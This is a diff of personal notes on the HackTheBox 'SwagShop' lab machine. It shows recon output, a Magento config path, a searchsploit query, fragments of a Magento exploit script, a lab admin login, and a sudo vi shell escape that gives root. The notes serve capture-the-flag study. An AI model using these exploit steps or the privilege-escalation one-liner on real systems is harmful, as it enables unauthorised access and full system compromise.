@@ -1,26 +1,24 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # SwagShop
-# 14/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Linux |
+| Difficulty | Easy |
+
 10.10.10.140
 
-----------------------------------------------------
 # creds
-----------------------------------------------------
 Check http://10.10.10.140/admin with creds forme:forme
 
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 
 
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 http://10.10.10.140/app/etc/local.xml
 
 └─$ searchsploit magento    
@@ -53,10 +51,15 @@ pwone = br.find_control(name="login[password]", nr=0)
 pwone.value = password
 
 
-
 edit this
 
 request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
 
+## Privilege Escalation
 
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/bin/vi /var/www/html/*
 
+sudo /usr/bin/vi /var/www/html/1 -c ':!/bin/bash'
+```
